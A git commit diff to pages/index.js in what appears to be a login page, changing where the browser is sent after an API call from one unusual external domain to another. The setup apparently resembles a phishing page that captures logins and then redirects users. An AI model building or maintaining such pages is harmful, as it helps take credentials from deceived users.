30bbdd95a9753f25687a9efe1b43c628ce8151c2
husknet <127146284+husknet@users.noreply.github.com>
2025-02-07 11:25:01 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://kark.loglinefoline.shop/';
+      window.location.href = 'https://kar.flstoredrive.rocks/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
